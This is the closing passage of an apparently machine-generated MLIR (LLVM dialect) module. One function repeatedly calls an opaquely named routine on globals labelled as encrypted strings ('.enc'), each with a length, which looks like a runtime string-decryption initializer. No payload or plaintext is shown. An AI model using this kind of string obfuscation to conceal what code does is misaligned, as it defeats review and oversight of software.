    llvm.call @f_b7bfea9b(%355, %354) : (!llvm.ptr, i32) -> ()
    %356 = llvm.mlir.constant(9 : i32) : i32
    %357 = llvm.mlir.addressof @".str.179.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%357, %356) : (!llvm.ptr, i32) -> ()
    %358 = llvm.mlir.constant(28 : i32) : i32
    %359 = llvm.mlir.addressof @".str.180.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%359, %358) : (!llvm.ptr, i32) -> ()
    %360 = llvm.mlir.constant(25 : i32) : i32
    %361 = llvm.mlir.addressof @".str.181.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%361, %360) : (!llvm.ptr, i32) -> ()
    %362 = llvm.mlir.constant(19 : i32) : i32
    %363 = llvm.mlir.addressof @".str.182.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%363, %362) : (!llvm.ptr, i32) -> ()
    %364 = llvm.mlir.constant(39 : i32) : i32
    %365 = llvm.mlir.addressof @".str.183.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%365, %364) : (!llvm.ptr, i32) -> ()
    %366 = llvm.mlir.constant(38 : i32) : i32
    %367 = llvm.mlir.addressof @".str.184.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%367, %366) : (!llvm.ptr, i32) -> ()
    %368 = llvm.mlir.constant(14 : i32) : i32
    %369 = llvm.mlir.addressof @".str.185.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%369, %368) : (!llvm.ptr, i32) -> ()
    %370 = llvm.mlir.constant(35 : i32) : i32
    %371 = llvm.mlir.addressof @".str.186.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%371, %370) : (!llvm.ptr, i32) -> ()
    %372 = llvm.mlir.constant(40 : i32) : i32
    %373 = llvm.mlir.addressof @".str.187.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%373, %372) : (!llvm.ptr, i32) -> ()
    %374 = llvm.mlir.constant(35 : i32) : i32
    %375 = llvm.mlir.addressof @".str.188.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%375, %374) : (!llvm.ptr, i32) -> ()
    %376 = llvm.mlir.constant(35 : i32) : i32
    %377 = llvm.mlir.addressof @".str.189.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%377, %376) : (!llvm.ptr, i32) -> ()
    %378 = llvm.mlir.constant(39 : i32) : i32
    %379 = llvm.mlir.addressof @".str.190.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%379, %378) : (!llvm.ptr, i32) -> ()
    %380 = llvm.mlir.constant(56 : i32) : i32
    %381 = llvm.mlir.addressof @".str.191.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%381, %380) : (!llvm.ptr, i32) -> ()
    %382 = llvm.mlir.constant(51 : i32) : i32
    %383 = llvm.mlir.addressof @".str.192.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%383, %382) : (!llvm.ptr, i32) -> ()
    %384 = llvm.mlir.constant(47 : i32) : i32
    %385 = llvm.mlir.addressof @".str.193.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%385, %384) : (!llvm.ptr, i32) -> ()
    %386 = llvm.mlir.constant(77 : i32) : i32
    %387 = llvm.mlir.addressof @".str.194.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%387, %386) : (!llvm.ptr, i32) -> ()
    %388 = llvm.mlir.constant(53 : i32) : i32
    %389 = llvm.mlir.addressof @".str.195.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%389, %388) : (!llvm.ptr, i32) -> ()
    %390 = llvm.mlir.constant(33 : i32) : i32
    %391 = llvm.mlir.addressof @".str.196.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%391, %390) : (!llvm.ptr, i32) -> ()
    %392 = llvm.mlir.constant(34 : i32) : i32
    %393 = llvm.mlir.addressof @".str.197.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%393, %392) : (!llvm.ptr, i32) -> ()
    llvm.return
  }
}

